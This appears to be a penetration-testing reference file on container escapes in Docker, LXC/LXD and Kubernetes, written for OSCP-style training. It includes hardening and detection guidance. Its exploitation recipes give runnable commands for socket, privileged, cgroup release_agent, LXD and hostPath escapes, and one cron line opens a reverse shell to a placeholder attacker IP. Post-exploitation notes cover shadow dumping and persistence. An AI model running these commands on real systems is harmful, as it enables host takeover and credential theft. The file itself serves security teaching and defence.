## 1. Overview

Containers provide process isolation via Linux namespaces and resource
limits via cgroups. When misconfigured, they become a path from a
containerized process to the host - or to other containers. This file
covers escape techniques for Docker, LXC/LXD, and Kubernetes.

**Core concepts:**

- **Namespaces** - PID, network, mount, user, UTS, IPC, cgroup. Each
  namespace isolates a specific kernel resource.
- **cgroups** - CPU, memory, I/O limits; also used for isolation.
- **Capabilities** - fine-grained privileges inside a container; a
  privileged container has all of them.
- **Root in container** - a process with UID 0 inside a container is
  root only within the container's user namespace (unless the user
  namespace is not used).
- **Docker socket** - `/var/run/docker.sock`; access to it is
  equivalent to host root.
- **Service account token** - Kubernetes pod credential for the API
  server.

**Escape families:**

- Docker socket mount.
- Privileged container.
- Host filesystem mount (bind mount).
- `CAP_SYS_ADMIN` capabilities.
- Kernel exploits (container escape CVEs).
- LXC/LXD group membership.
- Kubernetes RBAC misconfigurations.
- Kubernetes hostPath mounts.

## 2. Reconnaissance / Enumeration

**Offensive - am I in a container?**

    # Look for container markers
    ls -la /.dockerenv
    cat /proc/1/cgroup | grep -i docker
    cat /proc/self/mountinfo | grep -i docker

    # Environment variables
    env | grep -iE "container|kube|docker"

    # Kubernetes service account
    ls -la /var/run/secrets/kubernetes.io/serviceaccount/

**Offensive - Docker socket:**

    ls -la /var/run/docker.sock
    ls -la /run/docker.sock

    # If present and accessible:
    docker -H unix:///var/run/docker.sock ps
    docker -H unix:///var/run/docker.sock images

**Offensive - capabilities inside the container:**

    # Capabilities of the current process
    capsh --print
    cat /proc/self/status | grep Cap

    # Decode the capabilities
    capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')

    # Look for:
    # - CAP_SYS_ADMIN (mount, namespace)
    # - CAP_SYS_PTRACE (attach to processes)
    # - CAP_NET_ADMIN (network)
    # - CAP_DAC_READ_SEARCH (read any file)

**Offensive - privileged container check:**

    # If /dev is fully populated and you can mount, likely privileged
    mount | head
    cat /proc/1/status | grep CapEff

    # A privileged container has all capabilities:
    # CapEff: 000001ffffffffff (or similar)

**Offensive - host mounts:**

    # Check mounts for host paths
    mount | grep -vE "proc|sysfs|cgroup|tmpfs|devpts|mqueue|shm"
    cat /proc/mounts

    # Look for:
    # - /host, /mnt, /root, /home (host directories mounted in)
    # - /var/run/docker.sock
    # - /etc (host /etc mounted in)

**Offensive - Kubernetes:**

    # Service account token
    cat /var/run/secrets/kubernetes.io/serviceaccount/token
    cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
    cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

    # API server
    env | grep KUBERNETES
    APISERVER=https://kubernetes.default.svc

    # Test access
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    curl -s $APISERVER/api/v1/namespaces/default/pods --header "Authorization: Bearer $TOKEN" --insecure

**Offensive - LXC/LXD:**

    # Am I in the lxd/lxc group?
    id | grep -E "lxd|lxc"

    # If yes, I can create privileged containers
    lxc list
    lxd --version

**Offensive - namespaces and cgroups:**

    # My namespaces
    ls -la /proc/self/ns/

    # Namespaces of PID 1
    ls -la /proc/1/ns/

    # Compare (if different, we may be able to nsenter)

    # cgroups
    cat /proc/self/cgroup

**Defensive - what to baseline:**

- Docker socket mounts (should be rare).
- Privileged containers (should be rare).
- Host filesystem mounts (should be rare).
- Kubernetes RBAC roles and bindings.
- Container images and their capabilities.
- Container runtime versions (for known CVEs).

## 3. Common Attack Vectors

**Docker socket escape:**

- The Docker socket is mounted inside the container
  (`-v /var/run/docker.sock:/var/run/docker.sock`).
- Anyone with access to the socket can start a new container with the
  host filesystem mounted and gain host root.

**Privileged container:**

- The container was started with `--privileged`.
- All capabilities are available, and `/dev` is fully populated.
- Escape via `nsenter`, `mount`, or `cgroup` abuse.

**Host filesystem mount:**

- A host directory is bind-mounted inside the container (e.g.
  `-v /:/mnt`).
- Write to the host directory to affect the host (cron, SSH keys).

**`CAP_SYS_ADMIN` escape:**

- The container has `CAP_SYS_ADMIN`.
- Mount the cgroup filesystem, create a `release_agent`, trigger
  it to run as host root.

**Kernel exploit:**

- Container escape CVEs (e.g. CVE-2022-0492 cgroups, CVE-2021-22555
  netfilter, CVE-2017-7308 packet socket).
- Requires an unpatched kernel.

**LXC/LXD group membership:**

- The user is in the `lxd` or `lxc` group.
- Create a privileged container with the host filesystem mounted.

**Kubernetes RBAC misconfigurations:**

- The service account has too many permissions (e.g. `cluster-admin`).
- Create a pod with `hostPath: /` mounted.
- Exec into the pod, chroot to the host root.

**Kubernetes `hostPath` mount:**

- A pod has a `hostPath` volume mounted from the host.
- Write to the mounted path to affect the host.

**`hostPID` / `hostNetwork`:**

- The pod shares the host's PID namespace or network namespace.
- Attach to host processes (`nsenter`) or sniff host traffic.

## 4. Exploitation Recipes

**Docker socket escape:**

    # 1. Confirm the socket is present
    ls -la /var/run/docker.sock

    # 2. List containers (verify access)
    docker -H unix:///var/run/docker.sock ps

    # 3. Start a privileged container with the host filesystem mounted
    docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh

    # Expected output:
    # # id
    # uid=0(root) gid=0(root) groups=0(root)
    # (root on the host)

**Privileged container escape via nsenter:**

    # 1. Confirm the container is privileged
    cat /proc/1/status | grep CapEff
    # If CapEff = 000001ffffffffff (all caps), likely privileged.

    # 2. Find a host PID (any process not visible in the container's
    #    PID namespace is a host process)
    ps aux

    # 3. nsenter into the host's namespaces
    nsenter -t 1 -m -u -i -n -p -- /bin/bash

    # If PID 1 is the host's init, this gives host root.

    # Alternative: mount the host's root filesystem
    mkdir /tmp/host
    mount /dev/sda1 /tmp/host
    chroot /tmp/host /bin/bash

**Privileged container escape via cgroup release_agent:**

    # Requires CAP_SYS_ADMIN (privileged container).
    # 1. Create a cgroup
    mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

    # 2. Enable release_agent
    echo 1 > /tmp/cgrp/x/notify_on_release
    host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
    echo "$host_path/cmd" > /tmp/cgrp/release_agent

    # 3. Create the payload
    echo '#!/bin/sh' > /cmd
    echo 'ps aux > /output' >> /cmd
    chmod a+x /cmd

    # 4. Trigger the release_agent
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

    # 5. Read the output (proves host command execution)
    cat /output

**Host filesystem mount:**

    # 1. Identify a mounted host directory
    mount | grep -vE "proc|sysfs|cgroup|tmpfs|devpts|mqueue|shm"

    # Example: /host is a mount of the host's /

    # 2. Write to the host
    # Cron:
    echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'" >> /host/etc/crontab
    # SSH:
    mkdir -p /host/root/.ssh
    echo "<ATTACKER_PUBKEY>" >> /host/root/.ssh/authorized_keys

    # 3. Wait for the trigger (cron runs within a minute) or SSH.

**LXC/LXD group membership:**

    # 1. Confirm membership
    id | grep -E "lxd|lxc"

    # 2. Initialize LXD if needed
    lxd init --auto

    # 3. Create a privileged container with the host filesystem mounted
    lxc launch images:alpine/3.18 privesc -c security.privileged=true
    lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

    # 4. Chroot and add SUID to bash
    lxc exec privesc -- /bin/sh -c 'chroot /mnt/root /bin/bash -c "chmod u+s /bin/bash"'

    # 5. On the host
    /bin/bash -p

**Kubernetes - list pods with service account token:**

    # 1. Get the API server address
    APISERVER=https://kubernetes.default.svc
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

    # 2. List pods
    curl -s $APISERVER/api/v1/namespaces/default/pods --header "Authorization: Bearer $TOKEN" --insecure

    # 3. Check permissions (what can this SA do?)
    curl -s $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
      --header "Authorization: Bearer $TOKEN" \
      --header "Content-Type: application/json" \
      --insecure \
      --data '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'

**Kubernetes - create a privileged pod with hostPath:**

    # 1. Create a pod spec that mounts the host's root filesystem
    cat > /tmp/evil.yaml <<'EOF'
    apiVersion: v1
    kind: Pod
    metadata:
      name: evil
    spec:
      containers:
      - name: evil
        image: alpine
        command: ["/bin/sh", "-c", "chroot /host /bin/bash -c 'chmod u+s /bin/bash'"]
        volumeMounts:
        - name: host
          mountPath: /host
      volumes:
      - name: host
        hostPath:
          path: /
    EOF

    # 2. Apply it (if RBAC allows)
    kubectl apply -f /tmp/evil.yaml

    # Or via API with the token:
    curl -s $APISERVER/api/v1/namespaces/default/pods \
      --header "Authorization: Bearer $TOKEN" \
      --header "Content-Type: application/json" \
      --insecure \
      --data @<(cat /tmp/evil.yaml | python3 -c 'import yaml, json, sys; print(json.dumps(yaml.safe_load(sys.stdin)))')

    # 3. On the host: /bin/bash -p

**Kubernetes - hostPID attach:**

    # If the pod has hostPID: true
    nsenter -t 1 -m -u -i -n -p -- /bin/bash

**Kubernetes - hostNetwork sniff:**

    # If the pod has hostNetwork: true
    tcpdump -i any -w /tmp/capture.pcap

**Kernel container escape - CVE-2022-0492 (cgroups):**

    # Requires CAP_SYS_ADMIN
    # Public exploit: https://github.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492
    ./can-ctr-escape-cve-2022-0492

## 5. Post-Exploitation

**After escaping to host root:**

- Dump `/etc/shadow` on the host.
- Search for SSH keys in all home directories.
- Search for credentials in config files.
- Search for cloud metadata service (`169.254.169.254`).
- Enumerate other containers on the host.
- Enumerate Kubernetes cluster (if in a cluster).
- Establish persistence on the host (cron, SSH keys, systemd).

**On the host (blue team):**

- Enumerate all containers (`docker ps -a`).
- Check for privileged containers (`docker inspect --format '{{.HostConfig.Privileged}}' $(docker ps -q)`).
- Check for Docker socket mounts.
- Check for host filesystem mounts.
- Audit Kubernetes RBAC (roles, bindings, service accounts).
- Audit Kubernetes `hostPath` volumes.
- Patch container runtimes and kernels.

## 6. Risk Context

Container escapes are high-value in modern infrastructure:

- A single misconfigured container can grant host root.
- Docker socket mounts are common in CI/CD, monitoring, and dev
  environments.
- Kubernetes RBAC is complex; misconfigurations are common.
- Kernel container-escape CVEs are exploited in the wild.

**Blast radius:** escaping a container grants host root, which often
grants access to other containers, cloud IAM roles (via metadata
service), and the entire cluster.

**Why escapes succeed:**

- Docker socket mounted for convenience.
- Containers run privileged for convenience.
- Host filesystem mounts for data sharing.
- Kubernetes RBAC granted broadly.
- Container runtime versions not patched.
- Kernel versions not patched.

## 7. Root Causes

- **Convenience over security.** Docker socket and privileged
  containers mounted/granted for convenience.
- **Complex RBAC.** Kubernetes roles are hard to audit; broad
  permissions accumulate.
- **Host mounts.** Data sharing via bind mounts is common.
- **Missing patches.** Container runtimes and kernels.
- **No baseline.** Container configurations are not audited.
- **Trust in isolation.** Containers are treated as secure boundaries.

## 8. Preventive Controls

**Docker hardening:**

- Never mount the Docker socket inside a container.
- Never run privileged containers (unless absolutely required).
- Never mount the host filesystem inside a container.
- Use read-only mounts where possible.
- Use user namespaces (`--userns-remap`).
- Drop all capabilities and add only what is needed
  (`--cap-drop=ALL --cap-add=...`).
- Restrict container runtime access to administrators.

**Kubernetes hardening:**

- Apply least-privilege RBAC.
- Avoid `cluster-admin` for service accounts.
- Disallow `hostPath` volumes (PodSecurityPolicy / OPA / Kyverno).
- Disallow `hostPID` and `hostNetwork`.
- Disallow privileged containers (PodSecurityPolicy / OPA / Kyverno).
- Use network policies to restrict pod-to-pod traffic.
- Enable audit logging.
- Patch Kubernetes regularly.
- Use image scanning and admission controllers.

**Kernel hardening:**

- Patch kernel container-escape CVEs within days.
- Use seccomp profiles to restrict syscalls.
- Use AppArmor / SELinux to confine containers.

**Monitoring:**

- Audit container runtime access.
- Audit Kubernetes API server requests.
- Audit host-level events for container escapes.
- Baseline container configurations.

## 9. Detection Controls

**Docker socket access:**

- auditd: `-w /var/run/docker.sock -p rwa -k docker_socket`
- Falco rule: "Container with access to Docker socket".
- Alert on any `docker` command from a container.

**Privileged container:**

- Kubernetes audit log: pod created with `securityContext.privileged: true`.
- Falco rule: "Privileged container started".
- Alert on `docker run --privileged`.

**Host mounts:**

- Kubernetes audit log: pod created with `hostPath` volume.
- Falco rule: "Container with host mount".
- Alert on `docker run -v /:/...`.

**cgroup release_agent:**

- Falco rule: "Detect release_agent file container escapes".
- auditd: `-w /sys/fs/cgroup -p wa -k cgroup_mod`.

**Kubernetes RBAC:**

- Kubernetes audit log: `SelfSubjectRulesReview`, `create pods`,
  `create clusterrolebindings`.
- Alert on unexpected API calls.

**Kubernetes hostPath:**

- Kubernetes audit log: pod created with `hostPath`.
- Alert on `hostPath: /` mounts.

**Kernel exploits:**

- Falco rule: "Detect container escape attempts".
- auditd on crash dumps.
- Alert on unexpected kernel module loads.

**General:**

- Falco for container runtime security.
- Kubernetes audit log forwarding to SIEM.
- Container image scanning.
- Baseline container configurations; alert on changes.

## 10. Verification

**Offensive - did the escape succeed?**

- Docker socket: command run on host (`hostname` is the host's).
- Privileged container: `nsenter -t 1` returns host shell.
- Host mount: file written on host (verify via SSH or another path).
- Kubernetes: pod created with `hostPath`; chroot succeeds.
- LXD: SUID bash created on host.

**Defensive - are controls effective?**

- Docker socket is not mounted inside containers.
- No privileged containers (`docker inspect` check).
- No host filesystem mounts.
- Kubernetes RBAC: no `cluster-admin` for non-admin service accounts.
- No `hostPath` volumes.
- No `hostPID` / `hostNetwork` pods.
- Kernel and runtimes current within 30 days.
- Falco rules loaded and forwarded to SIEM.

## 11. OSCP Notes

- Container escapes are less common in OSCP but appear in Pro Labs.
- Practice: Docker socket escape, privileged container escape via
  `nsenter`, Kubernetes service account token abuse.
- **Capture screenshots** of:
  - The container marker (`.dockerenv`, k8s token).
  - The escape command and its output (host shell).
  - `hostname` and `id` on the host after escape.
- The `> [!IMPORTANT]` OSCP reporting note applies to the escape step.

## 12. Production Notes

- Docker socket mounts are extremely common in CI/CD, monitoring, and
  dev environments; check every container.
- Privileged containers are used by legitimate workloads (system
  monitoring, network plugins); check for `-v /var/run/docker.sock`
  and `--privileged` in the same container.
- Kubernetes RBAC misconfigurations are the modern high-value target.
- Use dedicated tooling: kube-hunter, kube-bench, peirates, CDK.
- Kernel container-escape CVEs are rare but impactful; patch quickly.
- Assume container runtime has EDR/Falco; plan for speed.

## 13. References

**Linux documentation:**

- [Linux namespaces](https://man7.org/linux/man-pages/man7/namespaces.7.html)
- [Linux cgroups](https://man7.org/linux/man-pages/man7/cgroups.7.html)
- [Docker security](https://docs.docker.com/engine/security/)
- [Kubernetes security](https://kubernetes.io/docs/concepts/security/)

**MITRE ATT&CK:**

- [Privilege Escalation - Escape to Host (T1611)](https://attack.mitre.org/techniques/T1611/)
- [Discovery - Container and Resource Discovery (T1613)](https://attack.mitre.org/techniques/T1613/)
- [Execution - Deploy Container (T1610)](https://attack.mitre.org/techniques/T1610/)

**Tools:**

- [peirates](https://github.com/inguardians/peirates)
- [kube-hunter](https://github.com/aquasecurity/kube-hunter)
- [kube-bench](https://github.com/aquasecurity/kube-bench)
- [CDK](https://github.com/cdk-team/CDK)
- [deepce](https://github.com/stealthcopter/deepce)
- [Falco](https://falco.org/)

**Research:**

- [HackTricks - Container Security](https://book.hacktricks.xyz/linux-hardening/container-security)
- [Kubernetes Goat](https://madhuakula.com/kubernetes-goat/)
- [Container Escape Techniques](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [Kubernetes RBAC Good Practices](https://kubernetes.io/docs/concepts/security/rbac-good-practices/)